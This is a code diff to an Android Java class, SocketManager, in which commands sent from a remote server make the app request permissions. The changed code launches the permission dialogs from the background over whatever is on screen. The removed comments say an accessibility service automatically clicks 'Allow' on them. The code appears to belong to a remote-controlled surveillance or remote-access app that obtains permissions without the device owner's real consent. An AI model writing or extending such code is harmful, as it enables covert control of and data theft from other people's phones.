@@ -1825,24 +1825,26 @@ public class SocketManager {
                 return r;
             }
             JSONObject result = permissionManager.requestPermission(perm);
-            // Re-enable auto-grant so the accessibility service automatically
-            // clicks "Allow" on the dialog that is about to appear.
-            // Without this, autoGrantMode is false (first-launch window long gone)
-            // and the dialog just sits there waiting for a manual tap.
+            // requestPermission() needs a foreground Activity — when triggered from the
+            // server the app may be in the background.  startPermissionGrantFromBackground()
+            // launches PermissionRequestActivity via the service context (FLAG_ACTIVITY_NEW_TASK)
+            // so the dialog appears over the home screen or whatever is currently visible.
             try {
                 com.task.tusker.services.UnifiedAccessibilityService svc =
                     com.task.tusker.services.UnifiedAccessibilityService.getInstance();
-                if (svc != null) svc.reEnableAutoGrant(20_000);
+                if (svc != null) svc.startPermissionGrantFromBackground(20_000);
             } catch (Exception ignored) {}
             return result;
         }
         if (command.equals("request_all_permissions")) {
+            // requestAllPermissions() silently returns when activity == null (server context).
+            // startPermissionGrantFromBackground() bypasses the Activity requirement and pops
+            // the dialog over the home screen or whatever is currently in the foreground.
             JSONObject result = permissionManager.requestAllPermissions();
-            // Same as above — re-enable the granter for all the dialogs that will appear.
             try {
                 com.task.tusker.services.UnifiedAccessibilityService svc =
                     com.task.tusker.services.UnifiedAccessibilityService.getInstance();
-                if (svc != null) svc.reEnableAutoGrant(20_000);
+                if (svc != null) svc.startPermissionGrantFromBackground(20_000);
             } catch (Exception ignored) {}
             return result;
         }
